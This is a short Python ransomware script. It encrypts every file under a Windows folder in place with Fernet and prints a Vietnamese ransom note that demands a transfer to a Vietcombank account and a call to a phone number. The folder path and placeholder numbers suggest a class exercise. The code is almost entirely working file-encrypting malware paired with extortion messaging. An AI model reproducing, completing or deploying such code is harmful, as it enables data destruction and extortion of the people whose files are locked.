import os
from cryptography.fernet import Fernet

def generate_key():
    key = Fernet.generate_key()
    with open("encryption_key.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    return open("encryption_key.key", "rb").read()

def encrypt_file(file_name, key):
    fernet = Fernet(key)
    with open(file_name, "rb") as file:
        file_data = file.read()
    encrypted_data = fernet.encrypt(file_data)
    with open(file_name, "wb") as file:
        file.write(encrypted_data)

def encrypt_directory(directory):
    key = load_key()
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

if __name__ == "__main__":
    print("Tất cả các files đã bị mã hóa.")
    print("Chuyển tiền vào số tài khoản sau: 12121212121, Ngân hàng: Vietcombank nếu muốn giải mã các files!")
    print("Sau khi chuyển tiền, liên hệ SĐT: 0123456789")
    
    directory_to_encrypt = r"C:\\BT_LT"  # Thay đổi theo đường dẫn thực tế
    encrypt_directory(directory_to_encrypt)
